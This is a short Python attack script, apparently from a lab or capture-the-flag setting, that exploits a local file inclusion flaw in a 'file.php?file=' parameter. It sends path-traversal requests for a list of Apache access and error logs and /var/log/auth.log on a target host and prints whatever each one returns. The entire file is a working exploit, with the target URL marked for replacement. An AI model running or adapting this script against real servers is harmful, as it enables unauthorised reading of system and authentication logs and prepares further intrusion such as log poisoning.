#!/usr/bin/python3
#Author = 


import requests


log_list=[
'/etc/httpd/logs/access_log',
'/etc/httpd/logs/error_log',
'/var/www/logs/access_log',
'/var/www/logs/access.log', 
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/var/log/apache/access_log', 
'/var/log/apache2/access_log', 
'/var/log/apache/access.log',
'/var/log/apache2/access.log',
'/var/log/access_log',
'/var/log/auth.log'
] #Will Add More LFI paths

url = 'http://192.168.69.80/console/file.php?file=../../../../../../../..' # <- Change This



# r = requests.get(url=url2)
# print(r.text)


for i in log_list:
	f_url=url+i
	r = requests.get(url=f_url)
	print(f'Trying -> {i}')
	print(r.text)
	





